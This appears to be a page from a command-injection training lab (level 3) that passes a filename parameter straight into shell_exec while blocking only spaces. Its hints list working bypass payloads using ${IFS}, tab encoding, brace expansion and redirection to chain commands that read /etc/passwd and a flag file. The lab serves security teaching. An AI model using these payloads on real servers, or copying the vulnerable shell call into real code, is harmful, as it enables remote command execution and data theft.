<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 3 - Filter Bypass (Space)</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Level 3 - Filter Bypass (Space Filtering)</h1>
            <p><strong>Objective:</strong> Bypass space character filtering để thực hiện command injection</p>
        </div>

        <div class="form-container">
            <h3>🔍 File Info Tool:</h3>
            <p>Công cụ này hiển thị thông tin về file sử dụng lệnh 'file'. <strong>Security:</strong> Spaces are blocked!</p>
            
            <div class="code-block">Command: file <?php echo htmlspecialchars($_GET['filename'] ?? '[FILENAME]'); ?></div>
            
            <?php
            if (isset($_GET['filename'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $filename = $_GET['filename'];
                
                // Security filter - block spaces
                if (strpos($filename, ' ') !== false) {
                    echo '<div class="error">❌ Security Alert: Spaces are not allowed!</div>';
                } else {
                    $command = "file " . $filename;
                    $output = shell_exec($command);
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo 'No output or command failed';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="filename">Filename:</label>
                    <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars($_GET['filename'] ?? ''); ?>" placeholder="Enter filename (e.g., /etc/passwd)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Get File Info</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🚫 Active Security Filter</h3>
                <p><strong>Blocked Characters:</strong> Space (" ") character is filtered</p>
                <p><strong>Challenge:</strong> Execute commands without using spaces</p>
                <p><strong>Filter Code:</strong> <code>if (strpos($filename, ' ') !== false)</code></p>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔄 Space Bypass Techniques</h3>
                <ul>
                    <li><strong>${IFS}</strong> - Internal Field Separator (bash variable)</li>
                    <li><strong>$IFS$9</strong> - IFS with positional parameter</li>
                    <li><strong>%09</strong> - URL encoded tab character</li>
                    <li><strong>&lt;</strong> - Input redirection can sometimes work</li>
                    <li><strong>{,}</strong> - Brace expansion for some cases</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding the Filter</h4>
                    <p><strong>Current Command:</strong> <code>file [YOUR_INPUT]</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>/etc/passwd</code> (should work)</p>
                    <p>🚫 <strong>Test blocked:</strong> <code>/etc/passwd; ls -la</code> (spaces blocked)</p>
                    <p>🎯 <strong>Challenge:</strong> Execute commands without spaces</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Internal Field Separator (${IFS})</h4>
                    <p><strong>Concept:</strong> ${IFS} is a bash variable that represents space</p>
                    <p>📝 <strong>Test:</strong> <code>/etc/passwd;ls${IFS}-la</code></p>
                    <p>🎯 <strong>How it works:</strong> ${IFS} expands to space character</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>/etc/passwd;whoami</code> (no space needed)</p>
                    <p>• <code>/etc/passwd;cat${IFS}/etc/passwd</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Enhanced IFS Techniques</h4>
                    <p><strong>Advanced IFS:</strong> $IFS$9 (more reliable)</p>
                    <p>📝 <strong>Test:</strong> <code>/etc/passwd;cat$IFS$9/etc/passwd</code></p>
                    <p>🎯 <strong>Explanation:</strong> $9 is positional parameter (usually empty)</p>
                    <p><strong>Other variations:</strong></p>
                    <p>• <code>$IFS$1</code>, <code>$IFS$2</code>, etc.</p>
                    <p>• <code>${IFS}$9</code> with curly braces</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Tab Character Bypass</h4>
                    <p><strong>Concept:</strong> Tab character (%09) can replace spaces</p>
                    <p>📝 <strong>In URL:</strong> <code>/etc/passwd;ls%09-la</code></p>
                    <p>🎯 <strong>Note:</strong> URL encode tab character</p>
                    <p><strong>Manual tab input:</strong> Try pressing Tab key instead of space</p>
                    <p><strong>Alternative encoding:</strong></p>
                    <p>• <code>\t</code> in some contexts</p>
                    <p>• <code>\x09</code> hex encoding</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Brace Expansion & Redirections</h4>
                    <p><strong>Brace expansion:</strong> <code>{cat,/etc/passwd}</code></p>
                    <p>📝 <strong>Test:</strong> <code>/etc/passwd;{cat,/etc/passwd}</code></p>
                    <p><strong>Input redirection:</strong></p>
                    <p>• <code>/etc/passwd;cat&lt;/etc/passwd</code></p>
                    <p>• <code>/etc/passwd;&lt;/etc/passwd</code></p>
                    <p><strong>Command substitution:</strong></p>
                    <p>• <code>/etc/passwd;$(echo${IFS}cat${IFS}/etc/passwd)</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 6: Find the Flag!</h4>
                    <p><strong>🚀 Target flag location:</strong> <code>/tmp/blind_flag.txt</code></p>
                    <p><strong>Method 1 (IFS):</strong> <code>/etc/passwd;cat${IFS}/tmp/blind_flag.txt</code></p>
                    <p><strong>Method 2 (IFS$9):</strong> <code>/etc/passwd;cat$IFS$9/tmp/blind_flag.txt</code></p>
                    <p><strong>Method 3 (Tab):</strong> <code>/etc/passwd;cat%09/tmp/blind_flag.txt</code></p>
                    <p><strong>Method 4 (Brace):</strong> <code>/etc/passwd;{cat,/tmp/blind_flag.txt}</code></p>
                    <p><strong>Method 5 (Redirect):</strong> <code>/etc/passwd;cat&lt;/tmp/blind_flag.txt</code></p>
                    <p><strong>💡 Exploration:</strong> <code>/etc/passwd;find${IFS}/tmp${IFS}-name${IFS}*flag*</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level2.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level4.php">➡️ Next Level</a>
            <a href="submit.php?level=3">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 6;

    function updateCommand() {
        const input = document.getElementById('filename').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: file ' + (input || '[FILENAME]');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
